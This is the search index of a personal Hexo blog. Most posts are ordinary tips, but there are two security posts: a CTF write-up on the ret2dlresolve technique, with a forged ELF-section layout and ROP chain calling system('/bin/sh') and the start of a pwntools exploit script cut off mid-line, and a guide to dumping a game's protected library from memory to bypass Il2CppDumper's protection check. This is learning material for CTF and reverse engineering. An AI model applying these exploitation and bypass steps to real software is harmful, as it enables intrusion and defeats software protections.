<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>The First post from hexo</title>
    <url>/articles/b/</url>
    <content><![CDATA[<h1 id="Hexo-blog"><a href="#Hexo-blog" class="headerlink" title="Hexo blog"></a>Hexo blog</h1><p>Start to converting my original blog into current one.</p>
<p>And finished.</p>
<p>enjoy</p>
]]></content>
      <categories>
        <category>ABC</category>
      </categories>
      <tags>
        <tag>tagA</tag>
      </tags>
  </entry>
  <entry>
    <title>Bilibili的神秘番剧</title>
    <url>/articles/bilibili-de-shen-mi-fan-ju/</url>
    <content><![CDATA[<p>神秘动漫~</p>
<p><img data-src="/images/202104091324.png" alt="神秘动漫~"></p>
<p><a href="https://www.bilibili.com/bangumi/play/ss4243">https://www.bilibili.com/bangumi/play/ss4243</a></p>
<p><a href="https://www.bilibili.com/bangumi/media/md55232">https://www.bilibili.com/bangumi/media/md55232</a></p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>bilibili</tag>
      </tags>
  </entry>
  <entry>
    <title>通过GameGuardian来绕过Il2CppDumper反编译时遇到文件保护</title>
    <url>/articles/il2cppdumper-ni-xiang-shi-li/</url>
    <content><![CDATA[<p>在利用Il2CppDumper进行反编译的时候可能会出现Error的情况</p>
<p>以明日方舟为例子</p>
<p>本文主要介绍了在出现</p>
<p>ERROR: This file may be protected. 时</p>
<p>如何使用GameGuardian直接从内存中dump libil2cpp.so 来绕过文件保护。</p>
<span id="more"></span>

<h3 id="问题说明"><a href="#问题说明" class="headerlink" title="问题说明"></a>问题说明</h3><p>直接通过Il2CppDumper解包明日方舟apk中提取的libil2cpp.so文件会跳出</p>
<p><code>ERROR: This file may be protected.</code></p>
<p><img data-src="/images/202011291.png" alt="问题"></p>
<h3 id="解决方式"><a href="#解决方式" class="headerlink" title="解决方式"></a>解决方式</h3><p>根据README所说的<a href="https://github.com/Perfare/Il2CppDumper">Il2CppDumper</a>，出现<code>ERROR: This file may be protected.</code>时可以使用GameGuardian直接从内存中dump libil2cpp.so来绕过文件保护</p>
<p><img data-src="/images/202011292.png" alt="solution"></p>
<h3 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h3><p>首先开启GameGuardian，打开明日方舟后点击导出内存</p>
<p><img data-src="/images/pasted-2.png" alt="导出内存"></p>
<p>开始的内存地址选择libil2cpp.so第一次出现的地方（这里是<strong>976C8000</strong>），</p>
<p>结束的内存地址尽量选大一点防止文件没有被读完</p>
<p><img data-src="/images/202011294.png" alt="导出内存2"></p>
<p><img data-src="/images/202011295.png" alt="导出内存3"></p>
<p>导出之后得到的是一个bin结尾的文件，用Il2CppDumper加载这个bin文件和<strong>global-metadata.dat</strong>。输入开始地址<strong>976C8000</strong>，就可以成功绕过了。</p>
<p><img data-src="/images/202011296.png" alt="成功"></p>
]]></content>
  </entry>
  <entry>
    <title>解决Jupyterlab build 出现 DecodeError</title>
    <url>/articles/jupyterlab-build-chu-xian-decodeerror/</url>
    <content><![CDATA[<p>执行 jupyter lab build 时出现</p>
<p><code>UnicodeDecodeError: &#39;gbk&#39; codex can&#39;t decode byte 0xa4 in position 280</code></p>
<p><img data-src="/images/pasted-3.png" alt="错误"></p>
<span id="more"></span>

<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>打开<code>site-packages\jupyterlab\commands.py</code></p>
<p>在<code>_create_process</code>中添加<code>encoding=&quot;utf-8&quot;</code></p>
<p><img data-src="/images/202012141334.png" alt="示例"></p>
<p>再次运行jupyter lab build 就好了</p>
<p><img data-src="/images/202012141336.png" alt="build success"></p>
<h3 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h3><p>解决方式是在github的issue翻到的</p>
<p>链接： <a href="https://github.com/jupyterlab/jupyterlab/issues/8600">issue#8600</a></p>
<p>离谱的是，这个issue提到了这个bug并说明bug已经被改好了。</p>
<p>但之后怎么又给改回来了。。</p>
]]></content>
  </entry>
  <entry>
    <title>Ubuntu20.04出现打不开terminal的情况 - no module named apt_pkg</title>
    <url>/articles/ubuntu20-04-chu-xian-da-bu-kai-terminal-de-qing-kuang/</url>
    <content><![CDATA[<p>打开ubuntu之后发现开不起terminal.</p>
<p>然后firefox等其他应用正常打开。</p>
<p>开ctrl+alt+f3进入命令行界面发现捏马的</p>
<p><code>no module named apt_pkg</code></p>
<p>突然想起来，关机之前把&#x2F;usr&#x2F;bin&#x2F;python3的软链接把原来的python3.8改成python3.9了。。。</p>
<p>所以把软连接改回python3.8再reboot就行了。</p>
]]></content>
  </entry>
  <entry>
    <title>Ubuntu设置自定义分辨率</title>
    <url>/articles/ubuntu-she-zhi-zi-ding-yi-fen-bian-lu/</url>
    <content><![CDATA[<p>步骤很简单</p>
<p>假如你需要1920*1080的分辨率</p>
<p>1. <code>cvt 1920 1080</code>, 这段会输出类似这样的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 1920x1080 59.96 Hz (CVT 2.07M9) hsync: 67.16 kHz; pclk: 173.00 MHz</span><br><span class="line">Modeline &quot;1920x1080_60.00&quot;  173.00  1920 2048 2248 2576  1080 1083 1088 1120 -hsync +vsync</span><br></pre></td></tr></table></figure>

<p>2. 输入 <code>xrandr</code> 查看当前的output是啥, 如果是virtualBox一般来说是 Virtual1, 其他的自己看哪个输出多就是哪个。</p>
<p>3. <code>xrandr --newmode &quot;1920x1080_60.00&quot;  173.00  1920 2048 2248 2576  1080 1083 1088 1120 -hsync +vsync</code> 复制粘贴cvt给的数据</p>
<p>4. <code>xrandr --addmode Virtual1 1920x1080_60.00</code> 添加分辨率到输出里</p>
<p>5. 在setting中设置分辨率即可</p>
<p>6. 重启后可能会消失，把步骤3,4放到.profile里即可</p>
]]></content>
      <tags>
        <tag>linux</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>Wired Python lambda scope (lambda closure)</title>
    <url>/articles/wired-python-lambda-scope-lambda-closure/</url>
    <content><![CDATA[<p>think of this two code</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">powers = [<span class="keyword">lambda</span> x: x**i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line"><span class="built_in">print</span>(powers[<span class="number">3</span>](<span class="number">2</span>))</span><br><span class="line">powers1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">	powers1.append(<span class="keyword">lambda</span> x:x**i)</span><br><span class="line"><span class="built_in">print</span>(powers1[<span class="number">3</span>](<span class="number">2</span>))</span><br></pre></td></tr></table></figure>

<p>What do you expect the result.</p>
<span id="more"></span>
<p>The result is 512 and 512.  Not 8 and 8</p>
<p>The reason is lambda didn&#39;t evaluate i immediately.</p>
<blockquote>
<p>Python’s closures are late binding. This means that the values of variables used in closures are looked up at the time the inner function is called.</p>
</blockquote>
<p>ref: <a href="https://docs.python-guide.org/writing/gotchas/#late-binding-closures">https://docs.python-guide.org/writing/gotchas/#late-binding-closures</a></p>
<p>the correct implementation should be</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">powers = [<span class="keyword">lambda</span> x,j=i: x**j <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line"><span class="built_in">print</span>(powers[<span class="number">3</span>](<span class="number">2</span>))</span><br><span class="line">powers1 = []</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">a</span>(<span class="params">i</span>):</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">b</span>(<span class="params">x</span>):</span><br><span class="line">		<span class="keyword">return</span> x**i</span><br><span class="line">	<span class="keyword">return</span> b </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">	powers1.append(a(i))</span><br><span class="line"><span class="built_in">print</span>(powers1[<span class="number">3</span>](<span class="number">2</span>))</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Debugging binary with pwntools and radare2</title>
    <url>/articles/debugging-binary-with-pwntools-and-radare2/</url>
    <content><![CDATA[<h1 id="Brief"><a href="#Brief" class="headerlink" title="Brief"></a>Brief</h1><p>When using radare2 debugger, How to deal with the user input when debugging? There are two simple method.</p>
<ul>
<li>use rarun2 with stdio</li>
<li>use pwntools with debugger.</li>
</ul>
<h1 id="use-rarun2"><a href="#use-rarun2" class="headerlink" title="use rarun2"></a>use rarun2</h1><ol>
<li>open second terminal, enter <code>tty</code>, record the output<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ tty</span><br><span class="line">/dev/pts/2</span><br></pre></td></tr></table></figure></li>
<li>create a file p.rr2, write <code>stdio</code> equal the tty value you get from second termial<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># p.rr2 content</span><br><span class="line">stdio=/dev/pts/1</span><br></pre></td></tr></table></figure></li>
<li>in second terminal, run <code>sleep 9999999999</code> to wait for output and input</li>
<li>run <code>r2 -r p.rr2 -d vuln</code> in the first terminal and start debugging!</li>
</ol>
<p>see more: <a href="https://r2wiki.readthedocs.io/en/latest/tools/rarun2/">doc</a></p>
<h1 id="use-pwntools"><a href="#use-pwntools" class="headerlink" title="use pwntools"></a>use pwntools</h1><p>in the pwntool template, add following code</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">io = start()</span><br><span class="line">pid = util.proc.pidof(io)[0]</span><br><span class="line">print(&quot;The pid is: &quot;+str(pid))</span><br><span class="line">util.proc.wait_for_debugger(pid)</span><br><span class="line">input(&quot;press enter to continue&quot;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>then, run radare2 with <code>r2 -d pid</code>, using the pid from scripts.</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>radare2</tag>
        <tag>pwntools</tag>
        <tag>pwn</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - Return to dl-resolve Technique</title>
    <url>/articles/ret2-dl-resolve-example-silent-rop/</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>in th recent k3rn31ctf, there is a pwn question <strong>silent-ROP</strong>.</p>
<p>In this challenge, there is no output, neither put or printf is imported. So there is no way we can get the libc address&#x2F;version. Therefore, normal way of ret2libc didn&#39;t work in this case, because we can&#39;t get the address of <code>system</code> function.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:&gt; ii</span><br><span class="line">[Imports]</span><br><span class="line">nth vaddr      bind   type   lib name</span><br><span class="line">―――――――――――――――――――――――――――――――――――――</span><br><span class="line">1   0x08049070 GLOBAL FUNC       read</span><br><span class="line">2   0x00000000 WEAK   NOTYPE     __gmon_start__</span><br><span class="line">3   0x08049080 GLOBAL FUNC       __libc_start_main</span><br><span class="line">4   0x00000000 GLOBAL OBJ        stdin</span><br><span class="line">5   0x08049090 GLOBAL FUNC       setvbuf</span><br><span class="line">6   0x00000000 GLOBAL OBJ        stdout</span><br></pre></td></tr></table></figure>

<p>To solve this question, it required technique called <strong>ret2dlresolve</strong>, after serveral hour of reading article, i finally understand the process of return to dl resolve</p>
<span id="more"></span>
<p>here is some article I found useful</p>
<ol>
<li><a href="https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62">0ctf babystack with ret2dlresolve</a></li>
<li><a href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/">ROP之return to dl-resolve</a></li>
<li><a href="https://ypl.coffee/dl-resolve/">how dl-resolve works</a></li>
</ol>
<h1 id="0x1-How-dl-resolve-works"><a href="#0x1-How-dl-resolve-works" class="headerlink" title="0x1 How dl resolve works."></a>0x1 How dl resolve works.</h1><p>to perfrom ret2dlresolve, first we need to know how how dl resolve works. The detailed explaination can be found in the third link (how dl-resolve works) in the Introduction.</p>
<p>Take the silent-rop as example.</p>
<h2 id="Which-part-are-used-in-dl-resolve"><a href="#Which-part-are-used-in-dl-resolve" class="headerlink" title="Which part are used in dl resolve"></a>Which part are used in dl resolve</h2><p>first take look at <strong>.dynamic</strong> section, the dynamic section contains some address that will be used in the dl resolve.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(pyenv) aynakeya@LAPTOP-T6NBK8L5:~/ctf/k3rn3lctf2021/silent-rop$ readelf -d silent-ROP</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0x2f0c contains 24 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span><br><span class="line"> 0x0000000c (INIT)                       0x8049000</span><br><span class="line"> 0x0000000d (FINI)                       0x80492dc</span><br><span class="line"> 0x00000019 (INIT_ARRAY)                 0x804bf04</span><br><span class="line"> 0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x0000001a (FINI_ARRAY)                 0x804bf08</span><br><span class="line"> 0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x6ffffef5 (GNU_HASH)                   0x8048228</span><br><span class="line"> 0x00000005 (STRTAB)                     0x80482c8</span><br><span class="line"> 0x00000006 (SYMTAB)                     0x8048248</span><br><span class="line"> 0x0000000a (STRSZ)                      95 (bytes)</span><br><span class="line"> 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line"> 0x00000015 (DEBUG)                      0x0</span><br><span class="line"> 0x00000003 (PLTGOT)                     0x804c000</span><br><span class="line"> 0x00000002 (PLTRELSZ)                   24 (bytes)</span><br><span class="line"> 0x00000014 (PLTREL)                     REL</span><br><span class="line"> 0x00000017 (JMPREL)                     0x8048370</span><br><span class="line"> 0x00000011 (REL)                        0x8048358</span><br><span class="line"> 0x00000012 (RELSZ)                      24 (bytes)</span><br><span class="line"> 0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line"> 0x6ffffffe (VERNEED)                    0x8048338</span><br><span class="line"> 0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line"> 0x6ffffff0 (VERSYM)                     0x8048328</span><br><span class="line"> 0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure>

<p>There are 3 important segment <strong>JMPREL</strong>, <strong>STRTAB</strong> and <strong>SYMTAB</strong>.</p>
<h3 id="SYMTAB-STRTAB"><a href="#SYMTAB-STRTAB" class="headerlink" title="SYMTAB &amp; STRTAB"></a>SYMTAB &amp; STRTAB</h3><p>first lets take look at SYMTAB and STRTAB, those two section are actually closely related.</p>
<ul>
<li><p>SYMTAB segment refer to <strong>section.dynsym</strong> (in this case 0x08048248)</p>
</li>
<li><p>STRTAB segment refer to <strong>section.dynstr</strong> (in this case 0x080482c8)</p>
</li>
</ul>
<p>in elf sections, they are consecutive in adress</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[0x08049235]&gt; iS</span><br><span class="line">[Sections]</span><br><span class="line">nth paddr        size vaddr       vsize perm name</span><br><span class="line">―――――――――――――――――――――――――――――――――――――――――――――――――</span><br><span class="line">6   0x00000248   0x80 0x08048248   0x80 -r-- .dynsym</span><br><span class="line">7   0x000002c8   0x5f 0x080482c8   0x5f -r-- .dynstr</span><br></pre></td></tr></table></figure>

<p>.dynstr is a simple list that store all the function name. as shown at 0x080482c8.</p>
<p>.dynsym store the offset of function name in the .dynstr<br>and each <code>Elf32_Sym</code> struct have length of 0x10</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct </span><br><span class="line">&#123; </span><br><span class="line">   Elf32_Word st_name ; /* Symbol name (string tbl index) */</span><br><span class="line">   Elf32_Addr st_value ; /* Symbol value */ </span><br><span class="line">   Elf32_Word st_size ; /* Symbol size */ </span><br><span class="line">   unsigned char st_info ; /* Symbol type and binding */ </span><br><span class="line">   unsigned char st_other ; /* Symbol visibility under glibc&gt;=2.2 */ </span><br><span class="line">   Elf32_Section st_shndx ; /* Section index */ </span><br><span class="line">&#125; Elf32_Sym ;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[0x08049235]&gt; px @ 0x08048248</span><br><span class="line">- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF</span><br><span class="line">0x08048248  0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br><span class="line">0x08048258  2000 0000 0000 0000 0000 0000 1200 0000   ...............</span><br><span class="line">0x08048268  5000 0000 0000 0000 0000 0000 2000 0000  P........... ...</span><br><span class="line">0x08048278  3400 0000 0000 0000 0000 0000 1200 0000  4...............</span><br><span class="line">0x08048288  1a00 0000 0000 0000 0000 0000 1100 0000  ................</span><br><span class="line">0x08048298  2c00 0000 0000 0000 0000 0000 1200 0000  ,...............</span><br><span class="line">0x080482a8  2500 0000 0000 0000 0000 0000 1100 0000  %...............</span><br><span class="line">0x080482b8  0b00 0000 04a0 0408 0400 0000 1100 1100  ................</span><br><span class="line">0x080482c8  006c 6962 632e 736f 2e36 005f 494f 5f73  .libc.so.6._IO_s</span><br><span class="line">0x080482d8  7464 696e 5f75 7365 6400 7374 6469 6e00  tdin_used.stdin.</span><br><span class="line">0x080482e8  7265 6164 0073 7464 6f75 7400 7365 7476  read.stdout.setv</span><br><span class="line">0x080482f8  6275 6600 5f5f 6c69 6263 5f73 7461 7274  buf.__libc_start</span><br><span class="line">0x08048308  5f6d 6169 6e00 474c 4942 435f 322e 3000  _main.GLIBC_2.0.</span><br><span class="line">0x08048318  5f5f 676d 6f6e 5f73 7461 7274 5f5f 0000  __gmon_start__..</span><br><span class="line">0x08048328  0000 0200 0000 0200 0200 0200 0200 0100  ................</span><br><span class="line">0x08048338  0100 0100 0100 0000 1000 0000 0000 0000  ................</span><br></pre></td></tr></table></figure>

<p>for example, lets take look at second Elf32_Sym struct in the .dynsym</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x08048258  2000 0000 0000 0000 0000 0000 1200 0000   ...............</span><br></pre></td></tr></table></figure>
<p>0x20 indicate the string offset in .dynstr. if we take look at .dynstr + 0x20, we can found the corresponding function name string &quot;read\x00&quot;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[0x08049235]&gt; px @ 0x080482c8+0x20</span><br><span class="line">- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF</span><br><span class="line">0x080482e8  7265 6164 0073 7464 6f75 7400 7365 7476  read.stdout.setv</span><br></pre></td></tr></table></figure>

<h3 id="JMPREL"><a href="#JMPREL" class="headerlink" title="JMPREL"></a>JMPREL</h3><ul>
<li>JMPREL refer to the <strong>section.rel.plt</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(pyenv) aynakeya@LAPTOP-T6NBK8L5:~/ctf/k3rn3lctf2021/silent-rop$ readelf -r silent-ROP</span><br><span class="line"></span><br><span class="line">Relocation section &#x27;.rel.plt&#x27; at offset 0x370 contains 3 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">0804c00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0</span><br><span class="line">0804c010  00000307 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804c014  00000507 R_386_JUMP_SLOT   00000000   setvbuf@GLIBC_2.0</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[0x08049235]&gt; px @ 0x08048370</span><br><span class="line">- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF</span><br><span class="line">0x08048370  0cc0 0408 0701 0000 10c0 0408 0703 0000  ................</span><br><span class="line">0x08048380  14c0 0408 0705 0000 0000 0000 0000 0000  ................</span><br></pre></td></tr></table></figure>

<p>the data structure of .rel.plt are very different in x86 and x64 system. In this case, we are looking at x32 binary. So, in x86 system, the struct of .rel.plt is <code>Elf32_Rel</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef uint32_t Elf32_Addr;</span><br><span class="line">typedef uint32_t Elf32_Word;</span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Addr    r_offset;               /* Address */</span><br><span class="line">  Elf32_Word    r_info;                 /* Relocation type and symbol index */</span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line">#define ELF32_R_SYM(val) ((val) &gt;&gt; 8) #define ELF32_R_TYPE(val) ((val) &amp; 0xff)</span><br></pre></td></tr></table></figure>

<p><code>r_offset</code> store the address of Global offset table of corresponding function.</p>
<p><code>r_info</code> store the index address of <code>Elf32_Sym</code></p>
<p>For example, the <code>read</code> function in .rel.plt have <code>r_offset</code> of 0x8040c00c, which is the address of <code>read</code> in GOT.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;-- section..got.plt:</span><br><span class="line">;-- .got.plt:</span><br><span class="line">;-- _GLOBAL_OFFSET_TABLE_:</span><br><span class="line">0x0804c000      or al, 0xbf        ; 191 ; [24] -rw- section size 24 named .got.plt</span><br><span class="line">0x0804c002      add al, 8</span><br><span class="line">0x0804c004      add byte [eax], al</span><br><span class="line">0x0804c006      add byte [eax], al</span><br><span class="line">0x0804c008      add byte [eax], al</span><br><span class="line">0x0804c00a      add byte [eax], al</span><br><span class="line">;-- read:</span><br><span class="line">0x0804c00c      .dword 0x08049040  ; RELOC 32 read</span><br><span class="line">;-- __libc_start_main:</span><br><span class="line">0x0804c010      .dword 0x08049050  ; RELOC 32 __libc_start_main</span><br><span class="line">;-- setvbuf:</span><br><span class="line">0x0804c014      .dword 0x08049060  ; RELOC 32 setvbuf</span><br></pre></td></tr></table></figure>
<p><code>r_info</code> is 0701 in this case, which indicate the sym index is 0x01.</p>
<p>so, if we take look at <code>Elf32_Sym</code> struct at .dynsym + 0x01 * 0x10 (SYMTAB + index * length). </p>
<p>as shown in the SYMTAB part, this indicate the function <code>read</code>. which is exactly what we want.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[0x08049235]&gt; px @ 0x08048248 + 0x01*0x10</span><br><span class="line">- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF</span><br><span class="line">0x08048258  2000 0000 0000 0000 0000 0000 1200 0000   ...............</span><br></pre></td></tr></table></figure>

<h2 id="Process-of-dl-resolve"><a href="#Process-of-dl-resolve" class="headerlink" title="Process of dl resolve"></a>Process of dl resolve</h2><h3 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h3><p>Since dl resolve is called only when lazy binding is enabled. So dl resolve can only be called when the binary is <strong>Partial RELRO</strong> or <strong>No RELRO</strong></p>
<p>If a binary is <strong>Full RELRO</strong>, this means dl resolve will not be called. Therefore, it is return to dl resolve will not work in Full RELRO binary</p>
<h3 id="before-call-dl-resolve"><a href="#before-call-dl-resolve" class="headerlink" title="before call dl resolve"></a>before call dl resolve</h3><ol>
<li>normally, if we want to call a funtion. we first call function address at PLT.</li>
<li>if it is the first time call this function, the PLT will jump to GOT, push the real function address and jump back to plt, save the real function address to PLT for next call and then call the fucntion</li>
<li>if there is already a address in PLT, it just call the function</li>
</ol>
<p>but what if there is no value in the GOT due to lazy binding? here it comes dl resolve</p>
<h3 id="dl-resolve"><a href="#dl-resolve" class="headerlink" title="dl resolve"></a>dl resolve</h3><ol>
<li>if the GOT return 0x0, the the binary will use _dl_runtime_resolve() to find the real address</li>
<li>after getting the real address, it will save the real address to GOT</li>
<li>call the function with parameter.</li>
</ol>
<p><code>_dl_runtime_resolve</code> function is called in front of section.plt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;-- section..plt:</span><br><span class="line">;-- .plt:</span><br><span class="line">0x08049030      push dword [0x804c004] ; 0x804c004 is link_map</span><br><span class="line">0x08049036      jmp dword [0x804c008] ; 0x804c008 is the address of _dl_runtime_resolve</span><br><span class="line">0x0804903c      nop dword [eax]</span><br><span class="line">0x08049040      endbr32</span><br><span class="line">0x08049044      push 0</span><br><span class="line">0x08049049      jmp section..plt</span><br><span class="line">0x0804904e      nop</span><br></pre></td></tr></table></figure>

<p><code>_dl_runtime_resolve</code> do the following things</p>
<ol>
<li>it take link_map which store the all information of imported library</li>
<li>it also take rel_offset, which indicate the offset of struct of <code>Elf32_Rel</code> to .rel.plt</li>
<li>then it read the <code>r_info</code> in <code>Elf32_Rel</code></li>
<li>use <code>r_info</code> to find <code>Elf32_Sym</code></li>
<li>use <code>Elf32_Sym</code> struct to find function name</li>
<li>search by function name and then return real function address</li>
<li>call the function by it&#39;s paramter</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_dl_runtime_resolve(link_map, rel_offset) &#123;</span><br><span class="line">    Elf32_Rel * rel_entry = JMPREL + rel_offset ;</span><br><span class="line">    Elf32_Sym * sym_entry = &amp;SYMTAB [ ELF32_R_SYM ( rel_entry -&gt; r_info )];</span><br><span class="line">    char * sym_name = STRTAB + sym_entry -&gt; st_name ;</span><br><span class="line">    _search_for_symbol_(link_map, sym_name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x2-How-return-to-dl-resolve-work"><a href="#0x2-How-return-to-dl-resolve-work" class="headerlink" title="0x2 How return to dl-resolve work"></a>0x2 How return to dl-resolve work</h1><p>notice that in <code>_dl_runtime_resolve</code>, it use <code>rel_offset</code> to find the struct of <code>Elf32_Rel</code> and get the function name.</p>
<p>also notice that the boundary check for <code>rel_offset</code> is missing, so we an pass any value to the function</p>
<p>if we can find a writable address that higher than JMPREL, we can try to make a fake <code>Elf32_Rel</code> struct in fake <code>section.rel.plt</code> along with fake <code>section.dynsym</code> and fake <code>section.dynstr</code></p>
<p>after making those fake section, pass the section address offset to <code>_dl_runtime_resolve</code>, then <code>_dl_runtime_resolve</code> will automatically call the function.</p>
<h1 id="0x4-Example-Solution"><a href="#0x4-Example-Solution" class="headerlink" title="0x4 Example Solution"></a>0x4 Example Solution</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Arch:     i386-32-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<ol>
<li>the binary have an very obvious buffer overflow in <code>vuln</code>, so we can easily write ebp and eip</li>
<li>first we need to use <code>read</code> to create our fake section and ropchian to call dl_resolve</li>
<li>we want to fake the main to call read(0,fake_stack_address,0x300)</li>
<li>after creating fake stack, we want point esp to our fake stack and use ret to execute dl_resolve, there fore, we use leave;ret<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fake_stack_address &lt;- saved ebp</span><br><span class="line">jmp read &lt;- call read</span><br><span class="line">leave;ret; &lt;- saved eip. but we want to first point esp to the our stack and then ret so we can execute dl_resolve</span><br><span class="line">0x0 &lt;- para 1</span><br><span class="line">fake_stack_address &lt;- para 2</span><br><span class="line">fake_stack_length=0x300 &lt; para 3</span><br><span class="line">main stack</span><br></pre></td></tr></table></figure></li>
<li>then, in the stack we need to forge all the section we need and create rop chain<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AAAA &lt;- fake ebp</span><br><span class="line">// we want to fake that system call dl_resolve</span><br><span class="line">// push fake section.rel.plt</span><br><span class="line">dl_resolve</span><br><span class="line">fake_rel_plt_ptr</span><br><span class="line">AAAA &lt;- fake eip</span><br><span class="line">&quot;/bin/sh&quot; ptr &lt;- parameter 1</span><br><span class="line">// some fake stack where it call system(&quot;/bin/sh&quot;)</span><br><span class="line"></span><br><span class="line">-</span><br><span class="line"></span><br><span class="line">// fake section.rel.plt</span><br><span class="line">&#123;</span><br><span class="line">   Elf32_Addr r_offset ; /* Address */  Fake got</span><br><span class="line">   Elf32_Word r_info ; /* Relocation type and symbol index */  point to fake section.dynsym</span><br><span class="line">&#125;</span><br><span class="line">// fake section.dynsym</span><br><span class="line">point to &quot;system&quot; in fake section.dynstr</span><br><span class="line">// fake section.dynstr</span><br><span class="line">&quot;system&quot;</span><br><span class="line">// fake got</span><br><span class="line">// fake text</span><br><span class="line">&quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="0x5-Example-Exploits"><a href="#0x5-Example-Exploits" class="headerlink" title="0x5 Example Exploits"></a>0x5 Example Exploits</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># This exploit template was generated via:</span></span><br><span class="line"><span class="comment"># $ pwn template silent-ROP</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = context.binary = ELF(<span class="string">&#x27;silent-ROP&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">rop = ROP(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Many built-in settings can be controlled on the command-line and show up</span></span><br><span class="line"><span class="comment"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span></span><br><span class="line"><span class="comment"># for all created processes...</span></span><br><span class="line"><span class="comment"># ./exploit.py DEBUG NOASLR</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span 